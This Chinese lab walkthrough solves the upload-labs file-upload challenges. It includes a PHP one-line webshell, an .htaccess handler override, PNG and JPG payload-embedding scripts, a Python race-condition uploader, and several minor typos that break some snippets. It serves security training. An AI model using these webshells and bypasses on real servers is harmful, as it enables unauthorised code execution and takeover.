**upload-labs-pass-01**

方法一：

1.定位到上传文件的控制按钮，找到触发点

[![sgc7xH.md.png](https://s3.ax1x.com/2021/01/19/sgc7xH.md.png)](https://imgchr.com/i/sgc7xH)

2.去掉触发点或者去掉js代码，上传服务器可解析的脚本文件

```
<?php
error_reporting(0);
@eval($_POST['cmd']);
phpinfo();
?>
```

上传典型的一句话木马，为了演示成功加入解析phpinfo()函数

[![sg211g.png](https://s3.ax1x.com/2021/01/19/sg211g.png)](https://imgchr.com/i/sg211g)

3.上传成功，找到图片地址，并访问（单击右键复制图像地址）

[![sgfMh6.png](https://s3.ax1x.com/2021/01/19/sgfMh6.png)](https://imgchr.com/i/sgfMh6)

成功解析，可以getshell

方法二：

利用burpsuit抓包绕过（将脚本文件重命名为白名单允许文件，绕过前端js检测）

利用burpsuit抓包修改文件后缀名绕过。

[![sg5CtI.png](https://s3.ax1x.com/2021/01/19/sg5CtI.png)](https://imgchr.com/i/sg5CtI)

[![sg5O5n.png](https://s3.ax1x.com/2021/01/19/sg5O5n.png)](https://imgchr.com/i/sg5O5n)

### 2.后端检测Content-Type类型

主要代码

```
if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
```

发现只是单单判断了文件的content-type属于白名单过虑，可以使用burpsuit修改content-type来绕过

[![s2mnln.png](https://s3.ax1x.com/2021/01/19/s2mnln.png)](https://imgchr.com/i/s2mnln)

将它修改为白名单中允许的类型，成功上传，解析成功

### 3.后端黑名单限制，禁止上传asp、aspx、php、jsp后缀的文件

主要代码

```
if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array('.asp','.aspx','.php','.jsp');
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //收尾去空

        if(!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;            
            if (move_uploaded_file($temp_file,$img_path)) {
                 $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！';
        }
```

可以看出，后端为黑名单过滤，只过滤了.asp,.aspx,.php,.jsp文件，如果服务器支持解析php2、php3、phtml等文件后缀，那么我们可以上传后缀为这些的脚本文件，实现getshell。

**服务器apache支持解析php3、phtml**

在apache服务文件夹下找到配置文件httpd.conf

添加

```
AddType application/x-httpd-php .php .php3 .phtml
```

重启apache服务

这样apache服务器就可以解析php3及phtml文件了

### 4.后端黑名单限制，禁止上传了很多后缀的文件

主要代码

```
if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".php1",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".ini");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //收尾去空
```

可以看出禁用了很多常见的后缀

但我们可以看出它未禁用.hataccess

------

**.hataccess简介**

 .htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。

------

我们可以利用这个特性，将jpg文件解析问服务器可执行的脚本文件

```.hataccess
<FilesMatch "eval.jpg">
  SetHandler application/x-httpd-php
</FileMatch>
```

上传此文件后在上传eval.jpg文件后，服务器将会把eval.jpg文件解析成为PHP文件。

[![sW3SZd.png](https://s3.ax1x.com/2021/01/20/sW3SZd.png)](https://imgchr.com/i/sW3SZd)

### 5.大小写绕过

------

利用条件：服务器解析不区分大小写

apache：

加载mod_speling模块： LoadModule speling_module /usr/lib/apache2/modules/mod_speling.so

开启模块： CheckSpelling on

------

主要代码

```
if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空
```

可以看出没有过滤PHP，可以使用大写绕过。

[![sWc27R.png](https://s3.ax1x.com/2021/01/20/sWc27R.png)](https://imgchr.com/i/sWc27R)

### 6.空格绕过

------

利用条件：

windows

利用windows特性，windows会自动去掉后缀的空格

------

主要代码

```
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = $_FILES['upload_file']['name'];
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
```

可以看出，过滤很完整，但未删除后缀的空格，可以利用windows特性，上传php+空格的文件名，达到getshell。

[![shdD6s.png](https://s3.ax1x.com/2021/01/21/shdD6s.png)](https://imgchr.com/i/shdD6s)

[![shdWhF.png](https://s3.ax1x.com/2021/01/21/shdWhF.png)](https://imgchr.com/i/shdWhF)

### 7.文件名后缀点绕过（windows特性）

------

利用条件：windows

windows特性，会自动去掉后缀名中最后的”.”

------

主要代码

```
if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空
```

黑名单过滤，但未考虑将文件后缀最后的点去掉，，可以利用这点，绕过黑名单限制

上传php. 文件

[![shwV3Q.png](https://s3.ax1x.com/2021/01/21/shwV3Q.png)](https://imgchr.com/i/shwV3Q)

[![shwKH0.png](https://s3.ax1x.com/2021/01/21/shwKH0.png)](https://imgchr.com/i/shwKH0)

### 8. ::$DATA 进行绕过（windows）

------

利用条件：windows ntfs文件系统

Windows下NTFS文件系统的一个特性，即NTFS文件系统的存储数据流的一个属性 **DATA** 时，当我们访问a.php::$DATA,就是请求 a.php 本身的数据。

------

主要代码：

```
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = trim($file_ext); //首尾去空
```

未过滤::DATA,上传文件后缀带::DATA的脚本，绕过黑名单检测

[![s4A9sI.md.png](https://s3.ax1x.com/2021/01/21/s4A9sI.md.png)](https://imgchr.com/i/s4A9sI)

可以看到上传后后缀是不带有::$DATA的，所以访问时，，后缀是不需要加::$DATA

### 9.点+空格+点绕过(windows特性)

------

利用条件：windows

windows会自动将文件后缀最后的点去掉，会将文件后缀的最后的空格去掉。

------

主要代码

```
   if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空
```

应为代码对文件后缀去点去空格处理了，，所以可以利用上面的windows特性，构造点+空格+点的文件后缀绕过黑名单限制，最后上传到服务器名为.php，完成绕过

[![s4Vern.png](https://s3.ax1x.com/2021/01/21/s4Vern.png)](https://imgchr.com/i/s4Vern)

### 10.双写绕过

------

利用条件：过滤文件名时，使用空格替换

------

主要代码

```
$deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess");

        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = str_ireplace($deny_ext,"", $file_name);
```

后端将上传的文件匹配到黑名单的后缀并替换为空（不区分大写小写），所以可以使用pphphp文件后缀，当过滤掉php后，后缀为php，达到绕过效果。

[![s4nrkt.png](https://s3.ax1x.com/2021/01/21/s4nrkt.png)](https://imgchr.com/i/s4nrkt)

### 11.%00截断绕过

------

利用条件：

1. php版本小于5.3.4
2. php的magic_quotes_gpc为OFF状态

**%00截断原理**

截断的核心，就是chr(0)这个字符 这个字符不为空(Null)，也不是空字符(“”)，更不是空格。 当程序在输出含有chr(0)变量时 chr(0)后面的数据会被停止，换句话说，就是误把它当成结束符，后面的数据直接忽略，这就导致漏洞产生

------

主要代码

```
   $ext_arr = array('jpg','png','gif');
    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);
    if(in_array($file_ext,$ext_arr)){
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;
```

白名单过滤，但直接拼接了文件后缀名，可以利用 %00截断

构造图片马，修改上传路径，使用%00截断

[![s4G4HS.png](https://s3.ax1x.com/2021/01/21/s4G4HS.png)](https://imgchr.com/i/s4G4HS)

访问1.php

[![s4GjBT.png](https://s3.ax1x.com/2021/01/21/s4GjBT.png)](https://imgchr.com/i/s4GjBT)

### 12.%00截断post版

主要代码

```
$ext_arr = array('jpg','png','gif');
    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);
    if(in_array($file_ext,$ext_arr)){
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = $_POST['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;
```

使用psot方式传递了储存地址，利用%00截断

但这次需要在二进制中进行修改，因为post不会像get对%00进行自动解码。

[![s4NmUU.png](https://s3.ax1x.com/2021/01/21/s4NmUU.png)](https://imgchr.com/i/s4NmUU)

php16进制编码为706870，找到对应位置，将后一位修改为00

[![s4NaPe.png](https://s3.ax1x.com/2021/01/21/s4NaPe.png)](https://imgchr.com/i/s4NaPe)

访问22.php

[![s4N6Vf.png](https://s3.ax1x.com/2021/01/21/s4N6Vf.png)](https://imgchr.com/i/s4N6Vf)

### 13.检测文件前两个字节

------

利用条件：图片马+文件包含

------

主要代码

```
function getReailFileType($filename){
    $file = fopen($filename, "rb");
    $bin = fread($file, 2); //只读2字节
    fclose($file);
    $strInfo = @unpack("C2chars", $bin);    
    $typeCode = intval($strInfo['chars1'].$strInfo['chars2']);    
    $fileType = '';    
    switch($typeCode){      
        case 255216:            
            $fileType = 'jpg';
            break;
        case 13780:            
            $fileType = 'png';
            break;        
        case 7173:            
            $fileType = 'gif';
            break;
        default:            
            $fileType = 'unknown';
        }    
        return $fileType;
}
```

只读取了前两个字节，判断是否为图片文件的文件头

jpg/jpeg：255216

png:13780

gif:7173

直接找一张正常的图片，以文本形式打开，看，在最后添加脚本，

[![sI6Sc6.png](https://s3.ax1x.com/2021/01/22/sI6Sc6.png)](https://imgchr.com/i/sI6Sc6)

上传后，利用文件包含，执行图片中的脚本，实现getshell

[![sIgMkQ.png](https://s3.ax1x.com/2021/01/22/sIgMkQ.png)](https://imgchr.com/i/sIgMkQ)

------

**php文件包含常见函数**

**Include**:包含并运行指定文件，当包含外部文件发生错误时，系统给出警告，但整个php文件继续执行。 **Require**:跟include唯一不同的是，当产生错误时候，include下面继续运行而require停止运行了。 **Include_once**:这个函数跟include函数作用几乎相同，只是他在导入函数之前先检测下该文件是否被导入。如果已经执行一遍那么就不重复执行了。 **Require_once***:这个函数跟require的区别 跟上面我所讲的include和include_once是一样的

------

包含之后，可以看到，图片中的脚本被执行

[![sIRAqf.png](https://s3.ax1x.com/2021/01/22/sIRAqf.png)](https://imgchr.com/i/sIRAqf)

### 14判断文件大小

------

利用条件:图片马+文件包含

------

主要代码

```
function isImage($filename){
    $types = '.jpeg|.png|.gif';
    if(file_exists($filename)){
        $info = getimagesize($filename);
        $ext = image_type_to_extension($info[2]);
        if(stripos($types,$ext)>=0){
            return $ext;
        }else{
            return false;
        }
    }else{
        return false;
    }
}
```

**getimagesize()** 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型和一个可以用于普通 HTML 文件中 `IMG` 标记中的 height/width 文本字符串。

可以看出后端判断了文件类型及图片的大小，构造图片马，绕过

### 15.判断文件类型

------

利用条件：图片马+文件包含

------

主要代码

```
function isImage($filename){
    //需要开启php_exif模块
    $image_type = exif_imagetype($filename);
    switch ($image_type) {
        case IMAGETYPE_GIF:
            return "gif";
            break;
        case IMAGETYPE_JPEG:
            return "jpg";
            break;
        case IMAGETYPE_PNG:
            return "png";
            break;    
        default:
            return false;
            break;
    }
}
```

exif_imagetype — 判断一个图像的类型

利用图片马包含绕过。

### 16.二次渲染绕过

------

利用条件：可以绕过二次渲染的图片马+文件包含

------

主要代码

```
 // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径
    $filename = $_FILES['upload_file']['name'];
    $filetype = $_FILES['upload_file']['type'];
    $tmpname = $_FILES['upload_file']['tmp_name'];

    $target_path=UPLOAD_PATH.'/'.basename($filename);

    // 获得上传文件的扩展名
    $fileext= substr(strrchr($filename,"."),1);

    //判断文件后缀与类型，合法才进行上传操作
    if(($fileext == "jpg") && ($filetype=="image/jpeg")){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefromjpeg($target_path);

            if($im == false){
                $msg = "该文件不是jpg格式的图片！";
                @unlink($target_path);
            }else{
                //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".jpg";
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagejpeg($im,$img_path);
                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = "上传出错！";
        }

    }else if(($fileext == "png") && ($filetype=="image/png")){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefrompng($target_path);

            if($im == false){
                $msg = "该文件不是png格式的图片！";
                @unlink($target_path);
            }else{
                 //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".png";
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagepng($im,$img_path);

                @unlink($target_path);
                $is_upload = true;               
            }
        } else {
            $msg = "上传出错！";
        }

    }else if(($fileext == "gif") && ($filetype=="image/gif")){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefromgif($target_path);
            if($im == false){
                $msg = "该文件不是gif格式的图片！";
                @unlink($target_path);
            }else{
                //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".gif";
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagegif($im,$img_path);

                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = "上传出错！";
        }
imagecreatefrom #系列函数用于从文件或 URL 载入一幅图像，成功返回图像资源，失败则返回一个空字符串。
该系列函数有：
imagecreatefromgif()#：创建一块画布，并从 GIF 文件或 URL 地址载入一副图像
imagecreatefromjpeg()#：创建一块画布，并从 JPEG 文件或 URL 地址载入一副图像
imagecreatefrompng()#：创建一块画布，并从 PNG 文件或 URL 地址载入一副图像
imagecreatefromwbmp()#：创建一块画布，并从 WBMP 文件或 URL 地址载入一副图像
imagecreatefromstring()#：创建一块画布，并从字符串中的图像流新建一副图像
```

代码对后缀名和文件类型都进行了很严格的控制，而且在后面还对图片进行了二次编译

`jpg`和`png`很麻烦，`gif`只需要找到渲染前后没有变化的位置,然后将`php`代码写进去,就可以了

jpg 和png 的处理方法 参照https://xz.aliyun.com/t/2657 讲的很细致

**1.上传gif文件**

上传gif文件，下载对比

[![sTLUEQ.png](https://s3.ax1x.com/2021/01/23/sTLUEQ.png)](https://imgchr.com/i/sTLUEQ)

可以看出gif经过二次渲染后相同的地方挺多，所以只需在相同处插入一句话木马，就可绕过二次渲染。

第一次构造失败了，但可以看出只有<被渲染去掉了，，位移一位再次写入。

[![sTXzB8.png](https://s3.ax1x.com/2021/01/23/sTXzB8.png)](https://imgchr.com/i/sTXzB8)

[![sTjuEF.png](https://s3.ax1x.com/2021/01/23/sTjuEF.png)](https://imgchr.com/i/sTjuEF)

成功绕过二次渲染，解析了脚本文件

**2.上传png文件**

png较麻烦，直接上脚本

```
<?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
           0x66, 0x44, 0x50, 0x33);



$img = imagecreatetruecolor(32, 32);

for ($y = 0; $y < sizeof($p); $y += 3) {
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
}

imagepng($img,'./1.png');
?>
```

运行脚本，会生成1.png的文件，

[![sTzYD0.png](https://s3.ax1x.com/2021/01/23/sTzYD0.png)](https://imgchr.com/i/sTzYD0)

上传此文件，下载后查看16 进制文本

[![sTzYD0.png](https://s3.ax1x.com/2021/01/23/sTzYD0.png)](https://imgchr.com/i/sTzYD0)

**3.上传jpg文件**

上传任意一张jpg文件，下载到本地

使用脚本处理此文件 php jpg_payload.php 1.jpg

```
<?php
	/* The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled(). It is necessary that the size and quality of the initial image are the same as those of the processed image. 1) Upload an arbitrary image via secured files upload script 2) Save the processed image and launch: jpg_payload.php <jpg_name.jpg> In case of successful injection you will get a specially crafted image, which should be uploaded again. Since the most straightforward injection method is used, the following problems can occur: 1) After the second processing the injected data may become partially corrupted. 2) The jpg_payload.php script outputs "Something's wrong". If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image. Sergey Bobrov @Black2Fan. See also: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ */

	$miniPayload = "<?=phpinfo();?>";


	if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
    	die('php-gd is not installed');
	}
	
	if(!isset($argv[1])) {
		die('php jpg_payload.php <jpg_name.jpg>');
	}

	set_error_handler("custom_error_handler");

	for($pad = 0; $pad < 1024; $pad++) {
		$nullbytePayloadSize = $pad;
		$dis = new DataInputStream($argv[1]);
		$outStream = file_get_contents($argv[1]);
		$extraBytes = 0;
		$correctImage = TRUE;

		if($dis->readShort() != 0xFFD8) {
			die('Incorrect SOI marker');
		}

		while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {
			$marker = $dis->readByte();
			$size = $dis->readShort() - 2;
			$dis->skip($size);
			if($marker === 0xDA) {
				$startPos = $dis->seek();
				$outStreamTmp = 
					substr($outStream, 0, $startPos) . 
					$miniPayload . 
					str_repeat("\0",$nullbytePayloadSize) . 
					substr($outStream, $startPos);
				checkImage('_'.$argv[1], $outStreamTmp, TRUE);
				if($extraBytes !== 0) {
					while((!$dis->eof())) {
						if($dis->readByte() === 0xFF) {
							if($dis->readByte !== 0x00) {
								break;
							}
						}
					}
					$stopPos = $dis->seek() - 2;
					$imageStreamSize = $stopPos - $startPos;
					$outStream = 
						substr($outStream, 0, $startPos) . 
						$miniPayload . 
						substr(
							str_repeat("\0",$nullbytePayloadSize).
								substr($outStream, $startPos, $imageStreamSize),
							0,
							$nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
								substr($outStream, $stopPos);
				} elseif($correctImage) {
					$outStream = $outStreamTmp;
				} else {
					break;
				}
				if(checkImage('payload_'.$argv[1], $outStream)) {
					die('Success!');
				} else {
					break;
				}
			}
		}
	}
	unlink('payload_'.$argv[1]);
	die('Something\'s wrong');

	function checkImage($filename, $data, $unlink = FALSE) {
		global $correctImage;
		file_put_contents($filename, $data);
		$correctImage = TRUE;
		imagecreatefromjpeg($filename);
		if($unlink)
			unlink($filename);
		return $correctImage;
	}

	function custom_error_handler($errno, $errstr, $errfile, $errline) {
		global $extraBytes, $correctImage;
		$correctImage = FALSE;
		if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {
			if(isset($m[1])) {
				$extraBytes = (int)$m[1];
			}
		}
	}

	class DataInputStream {
		private $binData;
		private $order;
		private $size;

		public function __construct($filename, $order = false, $fromString = false) {
			$this->binData = '';
			$this->order = $order;
			if(!$fromString) {
				if(!file_exists($filename) || !is_file($filename))
					die('File not exists ['.$filename.']');
				$this->binData = file_get_contents($filename);
			} else {
				$this->binData = $filename;
			}
			$this->size = strlen($this->binData);
		}

		public function seek() {
			return ($this->size - strlen($this->binData));
		}

		public function skip($skip) {
			$this->binData = substr($this->binData, $skip);
		}

		public function readByte() {
			if($this->eof()) {
				die('End Of File');
			}
			$byte = substr($this->binData, 0, 1);
			$this->binData = substr($this->binData, 1);
			return ord($byte);
		}

		public function readShort() {
			if(strlen($this->binData) < 2) {
				die('End Of File');
			}
			$short = substr($this->binData, 0, 2);
			$this->binData = substr($this->binData, 2);
			if($this->order) {
				$short = (ord($short[1]) << 8) + ord($short[0]);
			} else {
				$short = (ord($short[0]) << 8) + ord($short[1]);
			}
			return $short;
		}

		public function eof() {
			return !$this->binData||(strlen($this->binData) === 0);
		}
	}
?>
```

上传处理后的文件

[![s7nHL8.png](https://s3.ax1x.com/2021/01/23/s7nHL8.png)](https://imgchr.com/i/s7nHL8)

### 17.条件竞争

------

利用条件：服务器端先存储，之后再进行处理

------

主要代码

```
$is_upload = false;
$msg = null;

if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_name = $_FILES['upload_file']['name'];
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $file_ext = substr($file_name,strrpos($file_name,".")+1);
    $upload_file = UPLOAD_PATH . '/' . $file_name;

    if(move_uploaded_file($temp_file, $upload_file)){
        if(in_array($file_ext,$ext_arr)){
             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext;
             rename($upload_file, $img_path);
             $is_upload = true;
        }else{
            $msg = "只允许上传.jpg|.png|.gif类型文件！";
            unlink($upload_file);
        }
    }else{
        $msg = '上传出错！';
    }
}
```

文件上传到服务器后通过rename修改名称，再通过unlink删除文件，因此可以通过条件竞争的方式在unlink之前，访问webshell。

通过burpsuit不断重发上传文件的包，我们可以不断访问我们上传的脚本文件，实现成功访问。

[![sLPi0H.png](https://s3.ax1x.com/2021/01/25/sLPi0H.png)](https://imgchr.com/i/sLPi0H)

[![sLCbm4.png](https://s3.ax1x.com/2021/01/25/sLCbm4.png)](https://imgchr.com/i/sLCbm4)

### 18.条件竞争2

------

利用条件：文件上传到服务器后再处理+apache解析漏洞

**Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断**

------

主要代码

```
$is_upload = false;
$msg = null;
if (isset($_POST['submit']))
{
    require_once("./myupload.php");
    $imgFileName =time();
    $u = new MyUpload($_FILES['upload_file']['name'], $_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['size'],$imgFileName);
    $status_code = $u->upload(UPLOAD_PATH);
    switch ($status_code) {
        case 1:
            $is_upload = true;
            $img_path = $u->cls_upload_dir . $u->cls_file_rename_to;
            break;
        case 2:
            $msg = '文件已经被上传，但没有重命名。';
            break; 
        case -1:
            $msg = '这个文件不能上传到服务器的临时文件存储目录。';
            break; 
        case -2:
            $msg = '上传失败，上传目录不可写。';
            break; 
        case -3:
            $msg = '上传失败，无法上传该类型文件。';
            break; 
        case -4:
            $msg = '上传失败，上传的文件过大。';
            break; 
        case -5:
            $msg = '上传失败，服务器已经存在相同名称文件。';
            break; 
        case -6:
            $msg = '文件无法上传，文件不能复制到目标目录。';
            break;      
        default:
            $msg = '未知错误！';
            break;
    }
}

//myupload.php
class MyUpload{

  var $cls_arr_ext_accepted = array(
      ".doc", ".xls", ".txt", ".pdf", ".gif", ".jpg", ".zip", ".rar", ".7z",".ppt",
      ".html", ".xml", ".tiff", ".jpeg", ".png" );
  function upload( $dir ){
    
    $ret = $this->isUploadedFile();
    
    if( $ret != 1 ){
      return $this->resultUpload( $ret );
    }

    $ret = $this->setDir( $dir );
    if( $ret != 1 ){
      return $this->resultUpload( $ret );
    }

    $ret = $this->checkExtension();
    if( $ret != 1 ){
      return $this->resultUpload( $ret );
    }

    $ret = $this->checkSize();
    if( $ret != 1 ){
      return $this->resultUpload( $ret );    
    }
    
    // if flag to check if the file exists is set to 1
    
    if( $this->cls_file_exists == 1 ){
      
      $ret = $this->checkFileExists();
      if( $ret != 1 ){
        return $this->resultUpload( $ret );    
      }
    }

    // if we are here, we are ready to move the file to destination

    $ret = $this->move();
    if( $ret != 1 ){
      return $this->resultUpload( $ret );    
    }

    // check if we need to rename the file

    if( $this->cls_rename_file == 1 ){
      $ret = $this->renameFile();
      if( $ret != 1 ){
        return $this->resultUpload( $ret );    
      }
    }
    
    // if we are here, everything worked as planned :)

    return $this->resultUpload( "SUCCESS" );
  
  }
};
```

后端对后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，将文件上传后，对文件重新命名。这样同样存在条件竞争的漏洞。可以使用脚本进行多线程跑，由于条件竞争，程序会出现来不及rename的问题，从而上传成功。

```
#coding=utf-8 import requests
from multiprocessing import Pool
def CompeteUpload(list):
    url="http://192.168.254.153/Pass-18/index.php"
    geturl="http://192.168.254.153/upload/shell.php.7z"
    file={'upload_file':('shell.php.7z',"<?php @eval($_POST['c1imber']);?>",'image/jpeg')}
    data={'submit':'上传'}
    r=requests.post(url=url,data=data,files=file)
    #print "test upload...."     r1=requests.get(url=geturl)
    if r1.status_code==200:
        print("upload success!")
if __name__=="__main__":
    pool = Pool(10)
    pool.map(CompeteUpload, range(10000))
    pool.close()
    pool.join()
```

